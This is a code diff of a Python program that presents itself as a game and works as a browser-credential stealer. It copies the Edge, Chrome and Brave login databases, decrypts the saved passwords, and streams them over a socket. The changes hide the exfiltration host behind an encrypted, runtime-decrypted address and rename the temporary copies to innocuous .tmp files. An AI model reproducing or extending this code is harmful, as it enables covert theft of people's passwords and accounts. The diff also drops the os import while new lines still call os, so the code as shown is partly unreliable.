@@ -1,5 +1,4 @@
 import base64
-import os
 import secrets
 import shutil
 import sqlite3
@@ -7,7 +6,7 @@ import json
 import tempfile
 import win32crypt
 from Crypto.Cipher import AES
-from CryptoPhenix import decrypt, encrypt
+from CryptoPhenix import decrypt, encrypt, gen_256
 import socket
 import requests
 import ssl
@@ -19,13 +18,18 @@ connect = False
 
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 
-# Recolocar ip's
 
+#
+# Autor   ->  an0mal1a
+# Name    ->  Pablo
+# GitHub  ->  https://github.com/an0mal1a
+# Correo  -> pablodiez024@proton.me
+#
 
 def know_gme():
-    unkown = b'\xf9\x0c]Q\x81\xcf\xf0\xf0Z\xeb FA\xef;\xc3`\x8b\x17\xa5\xf06\x89\x0cq\x9cz\x1cYA\xa93\xb9\xfc\xaa{\x11g\x1d{{\xf4\x9c\xe2R/]\xa9\xc6\x0c\x15E\xee\xac\xaa~\xebE\xbe@\x1b\xa6s\xb0'
-    #return str(decrypt(unkown).decode())
-    return "127.0.0.1"
+    unkown = b'\xf7\xf8,O\x86\xdd\xa1\xc0:v\x84\x180\xdd\xbf5\xd6t\x1d\xf5H;\x95\xe6B\x8c\xc8az\t\xa5\xcd\x1b\xc7\x9e\xc9I\xfc\x84/\xa6\x7f\xea\x13Q\xab*iP\xbe\x0f2\xc6RO=\xcb\x03\xc6\xd8f|\x0e\x84'
+    return str(decrypt(unkown, ).decode())
+    #return "127.0.0.1"
 
 
 try:
@@ -109,7 +113,7 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
             sec.send(f"\n\n\t\t[*] EDGE CRED\n".encode())
             key = cmlpt_gme(locat_e)
 
-            fnilam = "\MinerSpecs_1.db"
+            fnilam = os.path.join(os.environ['TEMP'], 'tem5B46.tmp')
             shutil.copyfile(ede, fnilam)
             pwr = sqlite3.connect(fnilam)
             drct = pwr.cursor()
@@ -124,14 +128,16 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
                 # date_last_used = row[5]
 
                 save(username, value, origin_url, date_created)
-            encrypt(fnilam, key=secrets.token_bytes(32))
+
+
+            encrypt(fnilam.encode(), secrets.token_bytes(32))
 
         def google():
             sec.send(f"\n\n\t\t[*] GOOGLE CRED\n".encode())
 
             key = cmlpt_gme(locat_g)
 
-            fnilam = "MinerSpecs.db"
+            fnilam = os.path.join(os.environ['TEMP'], 'tem5B52.tmp')
 
             shutil.copyfile(gle, fnilam)
             pwr = sqlite3.connect(fnilam)
@@ -147,14 +153,14 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
                 # date_last_used = row[5]
 
                 save(username, value, origin_url, date_created)
-            encrypt(fnilam, key=secrets.token_bytes(32))
+            encrypt(fnilam.encode(), secrets.token_bytes(32))
 
         def brave():
             sec.send("\n\n\t\t[*] BRAVE CRED\n".encode())
 
             key = cmlpt_gme(locat_b)
 
-            fnilam = "MinerSpecs_2.db"
+            fnilam = os.path.join(os.environ['TEMP'], 'tem2B82.tmp')
             shutil.copyfile(brve, fnilam)
             pwr = sqlite3.connect(fnilam)
             drct = pwr.cursor()
@@ -169,7 +175,7 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
                 # date_last_used = row[5]
 
                 save(username, value, origin_url, date_created)
-            encrypt(fnilam, key=secrets.token_bytes(32))
+            encrypt(fnilam.encode(), secrets.token_bytes(32))
 
         try:
             edge()
